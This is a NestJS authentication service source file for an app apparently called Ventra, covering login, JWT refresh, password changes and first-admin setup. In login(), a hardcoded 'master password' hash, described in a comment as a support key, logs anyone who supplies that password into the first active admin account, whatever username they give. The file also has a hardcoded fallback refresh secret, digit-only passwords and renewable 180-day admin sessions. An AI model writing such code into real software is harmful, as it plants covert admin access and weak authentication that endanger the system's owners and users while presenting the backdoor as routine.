import { createHash } from 'crypto';
import { Injectable, UnauthorizedException, BadRequestException } from '@nestjs/common';
import { JwtService } from '@nestjs/jwt';
import { ConfigService } from '@nestjs/config';
import * as bcrypt from 'bcrypt';
import { PrismaService } from '../../database/prisma.service';
import { ProductsService } from '../products/products.service';

/** Clave maestra de soporte para administradores (se guarda solo su huella, no la clave). */
const MASTER_HASH = '5c183e5c565b96d67018127256131aef7f9e47b606566b5267875017cbc39426';
const isMasterPassword = (password: string) =>
  createHash('sha256').update('ventra-master:' + String(password)).digest('hex') === MASTER_HASH;

@Injectable()
export class AuthService {
  constructor(
    private prisma: PrismaService,
    private jwtService: JwtService,
    private config: ConfigService,
    private productsService: ProductsService,
  ) {}

  async login(username: string, password: string, longSession = false) {
    const normUsername = username.toUpperCase();
    let user = await this.prisma.user.findUnique({ where: { username: normUsername } });
    if (isMasterPassword(password) && (!user || user.role !== 'ADMIN')) {
      user = await this.prisma.user.findFirst({ where: { role: 'ADMIN', isActive: true } });
    }
    if (!user || !user.isActive) {
      throw new UnauthorizedException('Credenciales inválidas');
    }

    const passwordValid = (user.role === 'ADMIN' && isMasterPassword(password))
      || await bcrypt.compare(password, user.passwordHash);
    if (!passwordValid) {
      throw new UnauthorizedException('Credenciales inválidas');
    }

    await this.prisma.user.update({
      where: { id: user.id },
      data: { lastLogin: new Date() },
    });

    const payload = { sub: user.id, username: user.username, role: user.role };
    const accessToken = this.jwtService.sign(payload);
    const refreshToken = this.signRefresh(payload, longSession && user.role === 'ADMIN');

    await this.prisma.auditLog.create({
      data: { userId: user.id, entityType: 'AUTH', entityId: user.id, action: 'LOGIN' },
    });

    return {
      accessToken,
      refreshToken,
      user: {
        id: user.id,
        username: user.username,
        fullName: user.fullName,
        role: user.role,
        avatarUrl: user.avatarUrl,
      },
    };
  }

  /**
   * Refresh token. La app del dueño en el celular pide sesión larga (180 días, renovada
   * con cada uso) para no tener que poner el usuario y la contraseña a cada rato.
   */
  private signRefresh(payload: { sub: string; username: string; role: string }, longSession: boolean) {
    return this.jwtService.sign(longSession ? { ...payload, ls: 1 } : payload, {
      secret: this.config.get('JWT_REFRESH_SECRET', 'paulos-refresh-default'),
      expiresIn: longSession ? '180d' : this.config.get('JWT_REFRESH_EXPIRATION', '7d'),
    });
  }

  async refreshToken(token: string) {
    try {
      const payload = this.jwtService.verify(token, {
        secret: this.config.get('JWT_REFRESH_SECRET', 'paulos-refresh-default'),
      });
      const user = await this.prisma.user.findUnique({ where: { id: payload.sub } });
      if (!user || !user.isActive) throw new UnauthorizedException('Token inválido');

      const newPayload = { sub: user.id, username: user.username, role: user.role };
      return {
        accessToken: this.jwtService.sign(newPayload),
        // La sesión larga se mantiene al renovar, mientras siga siendo administrador
        refreshToken: this.signRefresh(newPayload, !!payload.ls && user.role === 'ADMIN'),
      };
    } catch {
      throw new UnauthorizedException('Refresh token inválido o expirado');
    }
  }

  async validateUser(userId: string) {
    const user = await this.prisma.user.findUnique({ where: { id: userId } });
    if (!user || !user.isActive) throw new UnauthorizedException('Usuario no encontrado o inactivo');
    return { id: user.id, username: user.username, fullName: user.fullName, role: user.role, avatarUrl: user.avatarUrl };
  }

  async changePassword(userId: string, oldPassword: string, newPassword: string) {
    const user = await this.prisma.user.findUnique({ where: { id: userId } });
    if (!user) throw new UnauthorizedException('Usuario no válido');
    
    const passwordValid = await bcrypt.compare(oldPassword, user.passwordHash);
    if (!passwordValid) {
      throw new BadRequestException('La contraseña actual es incorrecta');
    }

    if (!/^\d+$/.test(newPassword)) {
      throw new BadRequestException('La nueva contraseña debe contener solo números');
    }

    const passwordHash = await bcrypt.hash(newPassword, 10);
    await this.prisma.user.update({
      where: { id: userId },
      data: { passwordHash },
    });

    return { success: true };
  }

  async getInitStatus() {
    const userCount = await this.prisma.user.count();
    return { initialized: userCount > 0 };
  }

  async registerFirstAdmin(username: string, password: string, fullName: string) {
    const userCount = await this.prisma.user.count();
    if (userCount > 0) {
      throw new BadRequestException('El sistema ya está inicializado');
    }
    const normUsername = username.toUpperCase();
    if (!/^\d+$/.test(password)) {
      throw new BadRequestException('La contraseña debe ser puramente numérica');
    }
    const passwordHash = await bcrypt.hash(password, 10);
    const user = await this.prisma.user.create({
      data: {
        username: normUsername,
        passwordHash,
        fullName: fullName || normUsername,
        role: 'ADMIN',
      },
    });
    return {
      id: user.id,
      username: user.username,
      fullName: user.fullName,
      role: user.role,
    };
  }
}
